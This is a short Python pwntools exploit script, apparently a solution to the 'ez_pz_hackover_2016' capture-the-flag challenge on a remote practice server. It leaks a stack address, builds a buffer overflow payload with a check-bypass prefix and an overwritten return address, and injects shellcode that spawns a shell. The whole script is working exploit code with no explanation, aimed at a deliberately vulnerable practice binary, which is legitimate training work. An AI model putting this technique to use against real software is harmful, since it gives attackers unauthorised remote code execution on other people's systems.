from pwn import *


def ez_pz_hackover_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ez_pz_hackover_2016'):
    print('ez_pz_hackover_2016 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 26829)
    target_elf = ELF(file_name)

    pop_ret = p32(0x08048401)  # pop ebx ; ret
    pop2_ret = p32(0x0804877a)  # pop edi ; pop ebp ; ret

    printf_got = target_elf.got['printf']

    target.recvuntil('Yippie, lets crash: ')
    stack_addr = int(target.recv(10), 16)
    print(hex(stack_addr))
    print(hex(stack_addr - 30))

    payload = b'crashme' + p8(0x0)
    payload += b'a' * (26 - len(payload))
    payload += p32(stack_addr + 30 - 58)
    payload += asm(shellcraft.sh())
    shellcode_addr = stack_addr - 30
    # payload=b'crashme\x00'+b"\x00"*14+p32(0)+p32(shellcode_addr)+asm(shellcraft.sh())#前面的crashme\x00绕过if判断
    # gdb.attach(target)
    target.recvuntil('Whats your name?\n')
    target.sendlineafter('> ', payload)
    target.interactive()

    print('ez_pz_hackover_2016 end')


if __name__ == '__main__':
    ez_pz_hackover_2016()
